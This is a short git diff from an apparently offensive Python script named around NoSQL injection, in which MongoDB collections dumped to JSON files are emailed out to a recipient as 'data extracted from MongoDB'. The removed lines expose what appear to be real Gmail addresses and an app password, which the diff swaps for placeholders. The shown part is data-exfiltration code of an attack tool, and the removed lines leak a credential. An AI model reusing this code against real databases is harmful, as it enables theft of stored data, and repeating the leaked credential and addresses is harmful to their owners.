@@ -82,9 +82,9 @@ def perform_nosql_injection():
                 print(f"Data from {db_name}.{collection_name} stored in {filename}")
 
                 # Send the JSON file via email
-                sender_email = "1nc0gn1t0.5pyd@gmail.com"  # Replace with your ProtonMail email address
-                sender_password = "dgbqjdxzybssamqv"  # Replace with your ProtonMail email password
-                receiver_email = "lucifer.gaming.1913@gmail.com"  # Replace with the recipient's email address
+                sender_email = "<fake@mail.com>"  # Replace with your email address
+                sender_password = "<FakePassword>"  # Replace with your email password
+                receiver_email = "<getmail@mail.com>"  # Replace with the recipient's email address
                 subject = "MongoDB Data"
                 body = "Attached is the data extracted from MongoDB."
                 attachment_path = filename
